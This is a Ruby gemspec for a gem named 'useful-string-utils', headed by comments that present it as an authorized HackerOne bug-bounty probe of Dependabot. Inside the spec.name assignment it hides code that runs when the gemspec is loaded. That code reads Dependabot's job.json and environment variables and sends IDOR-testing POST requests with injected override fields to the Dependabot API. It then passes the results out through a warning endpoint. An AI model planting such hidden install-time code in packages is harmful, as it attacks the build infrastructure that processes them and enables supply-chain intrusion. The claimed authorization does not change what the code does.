# frozen_string_literal: true
#
# v1.0 boundary-verification probe — orchestration server body-field
# validation audit.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; PROBE-MARK encoded outputs only; all "other-tenant"
# placeholders reference mr-benty-owned non-existent repos so no third-party
# action can result regardless of server response.
#
# Scope: HYP-NEW-BODYIDOR — verify whether the orchestration server's
# routing decision for write actions is determined ONLY by URL-jobId
# (boundary holds) or also processes body-supplied override fields
# (potential IDOR primitive).
#
# F011's existing evidence:
# - URL-jobId boundary holds (HYP-F011-A T0; cross-jobId returns 401/403)
# - Body fields land for legitimate-named fields like pr-title (T7-T9)
#
# Open question this probe addresses: does the server process body-
# supplied fields like `installation-id`, `target-repo`, `repo-owner`,
# `repo-name`, `job-id`, or `organization` if attacker-injected?
#
# Response-code-only observation. Targets are mr-benty-owned non-
# existent placeholders; if server processed any override field and
# attempted to act on the placeholder, the action would 404 (no such
# repo / no such PR), not state-change.
#
# Tests (all POST /update_jobs/<own>/update_pull_request, vary body):
#
# T1: minimal-shape baseline body                            → expect 400
# T2: T1 body + {"installation-id": 99999999}                → 400 if ignored, other if processed
# T3: T1 body + {"target-repo": "mr-benty/non-existent"}     → 400 if ignored, 404 if redirected
# T4: T1 body + {"repo-owner": "mr-benty", "repo-name":"x"}  → 400 if ignored, 404 if processed
# T5: T1 body + {"job-id": "<own_jobid+1>"}                  → 400 if ignored, auth-error if processed
# T6: T1 body + {"installation-target": 99999999}            → 400 if ignored
# T7: T1 body + {"organization": "mr-benty"}                 → 400 if ignored
#
# Outcome interpretation:
# - All T1-T7 return same code (likely 400) → boundary holds; server
#   strictly uses URL-jobId for routing.
# - Any test returns a DIFFERENT code → that body field is processed by
#   the server; potential IDOR primitive (not yet a finding without
#   additional evidence that the override succeeds in cross-tenant action).
#
# Output via PROBE-MARK encoded sha256+length only. After tests, the
# probe POSTs a single record_update_job_warning with the encoded
# summary as warn-description so the proxy log captures it (proven
# surfacing channel from HYP-F011-A T7).

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      results = []
      probe_mark = "PROBE-MARK-HYP-NEW-BODYIDOR"

      own_job_id = nil
      begin
        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
        parsed = JSON.parse(jjson)
        own_job_id = parsed.dig("job", "id") || parsed["id"]
      rescue
      end
      own_job_id ||= ENV["DEPENDABOT_JOB_ID"]

      results << "ownjob-#{own_job_id ? own_job_id.to_s[0, 12] : 'nil'}"

      api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"

      if own_job_id
        # Minimal-shape baseline body. The server's update_pull_request
        # endpoint normally requires dependency-names + updated-dependency-
        # files + base-commit-sha + commit-message + pr-title + pr-body.
        # We send a clearly-incomplete body so even if every override
        # variant is processed, the request fails post-validation BEFORE
        # any state-changing action.
        baseline_body = {
          "data" => {
            "dependency-names" => [],
            "base-commit-sha" => "0000000000000000000000000000000000000000",
            "pr-title" => "#{probe_mark}-T1-baseline"
          }
        }

        # Each variant adds an override field to the baseline.
        variants = [
          ["T1-baseline",            {}],
          ["T2-installation-id",     { "installation-id" => 99999999 }],
          ["T3-target-repo",         { "target-repo" => "mr-benty/non-existent-bodyidor-target" }],
          ["T4-repo-owner-name",     { "repo-owner" => "mr-benty", "repo-name" => "non-existent-bodyidor-target" }],
          ["T5-body-jobid",          { "job-id" => (own_job_id.to_i + 1).to_s }],
          ["T6-installation-target", { "installation-target" => 99999999 }],
          ["T7-organization",        { "organization" => "mr-benty" }],
        ]

        variants.each_with_index do |(label, override), i|
          begin
            body_data = baseline_body["data"].merge(override)
            body_json = { "data" => body_data }.to_json

            uri = URI("#{api_url}/update_jobs/#{own_job_id}/update_pull_request")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 4
            h.read_timeout = 6
            req = Net::HTTP::Post.new(uri.request_uri)
            req["Content-Type"] = "application/json"
            req["X-Probe-Mark"] = "#{probe_mark}-#{label}"
            req.body = body_json
            rsp = h.request(req)
            body_len = rsp.body.to_s.length
            body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 512])[0, 8]
            results << "T#{i+1}-#{label[0..18]}-s#{rsp.code}-l#{body_len}-h#{body_hash}"
          rescue => e
            results << "T#{i+1}-#{label[0..18]}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
          end
        end

        # Surface results via record_update_job_warning (proven channel).
        # warn-description carries the encoded summary so proxy log captures it.
        summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]

        begin
          uri = URI("#{api_url}/update_jobs/#{own_job_id}/record_update_job_warning")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          warn_body = {
            "data" => {
              "warn-type" => "#{probe_mark}-summary",
              "warn-title" => "#{probe_mark}-bodyfield-audit-summary",
              "warn-description" => summary
            }
          }
          req.body = warn_body.to_json
          h.request(req)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
